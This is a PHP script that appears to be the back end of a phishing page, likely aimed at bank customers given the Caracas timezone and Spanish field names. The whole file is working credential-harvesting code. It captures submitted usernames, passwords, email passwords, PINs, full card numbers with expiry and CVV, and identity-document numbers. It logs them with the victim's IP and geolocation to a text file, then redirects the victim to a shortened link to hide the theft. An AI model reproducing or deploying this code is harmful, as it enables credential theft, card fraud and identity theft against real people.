<?php

date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];
$ip_comp = $_SERVER['HTTP_CLIENT_IP'];
$userp = $_SERVER['HTTP_X_FORWARDED'];
$proxy = $_SERVER['HTTP_X_FORWARDED_FOR'];



$cc = trim(file_get_contents("http://ipinfo.io/{$proxy}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$proxy}/city"));
	
	$file = fopen("NEW01.txt", "a");
	
fwrite($file, 
"* USER: ".$_POST['user']."
* PASS: ".$_POST['pass']."
* EMAIL: ".$_POST['email']."
* E-PASS: ".$_POST['cpass']."
* PIN: ".$_POST['pin']."
* CARD: ".$_POST['card']."
* MES: ".$_POST['mes']."
* YEAR: ".$_POST['year']."
* CVV: ".$_POST['cvv']."
* DOCU: ".$_POST['docu']."
* N-DOCU: ".$_POST['ndocu']."
* FECHA: ".date('Y-m-d')."
* HORA: ".date('H:i:s')."
* IP: ".$ip."
* PROXY: ".$proxy."
* IP COMPARTIDA: ".$ip_comp."
".$userp."
".$cc."
".$city."   
" . PHP_EOL);
fwrite($file, "==============================" . PHP_EOL);
fclose($file);

header("location: https://bit.ly/3iG6y6N");

?>
